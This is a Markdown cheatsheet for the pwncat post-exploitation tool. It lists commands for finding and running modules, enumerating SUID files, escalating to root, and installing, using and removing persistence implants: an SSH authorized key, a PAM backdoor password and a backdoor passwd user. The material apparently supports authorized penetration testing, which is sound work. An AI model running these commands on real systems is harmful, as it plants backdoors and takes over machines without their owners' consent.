# pwncat Module Workflow Cheatsheet

Most capabilities in pwncat are implemented as modules. Use this flow:

1. `search` to discover modules
2. `use` to enter module context
3. `set` required arguments
4. `run` to execute
5. `info` to inspect module help/args

## Fast Discovery

```text
(local) pwncat$ search enumerate.*
(local) pwncat$ search implant.*
(local) pwncat$ search linux.*
```

## Run Directly (one-liner style)

```text
(local) pwncat$ run enumerate.gather types=file.suid
(local) pwncat$ run implant.authorized_key key=./id_rsa.pub
(local) pwncat$ run implant.passwd backdoor_user=svc-backup backdoor_pass='Str0ngPass!'
```

## Run In Context (repeatable style)

```text
(local) pwncat$ use enumerate.gather
(enumerate.gather) local$ info
(enumerate.gather) local$ set types file.suid
(enumerate.gather) local$ run
```

## Privilege Escalation Workflow

```text
(local) pwncat$ escalate list
(local) pwncat$ escalate list -u root
(local) pwncat$ escalate run
(local) pwncat$ escalate run -u root
```

Notes:
- `escalate run` attempts direct escalation first.
- If direct path fails, pwncat can recursively chain via intermediary users.

## Implant Lifecycle

```text
# install
(local) pwncat$ run implant.authorized_key key=./id_rsa.pub
(local) pwncat$ run implant.pam password='TempBackdoor!'
(local) pwncat$ run implant.passwd backdoor_user=svc-backup backdoor_pass='TempBackdoor!'

# list
(local) pwncat$ run implant
(local) pwncat$ run implant list

# use local implant to escalate
(local) pwncat$ run implant escalate

# remove
(local) pwncat$ run implant remove
```

## Session Hygiene

- Keep notes of module arguments used per host.
- Prefer key-based implants over password implants where possible.
- Remove temporary implants before ending operation.
- Validate still-connected session after each escalation (`whoami`, `id`, tty checks).

## Source Pointers

- `commands/run`, `commands/use`, `commands/search`
- `privesc` and `persist` docs
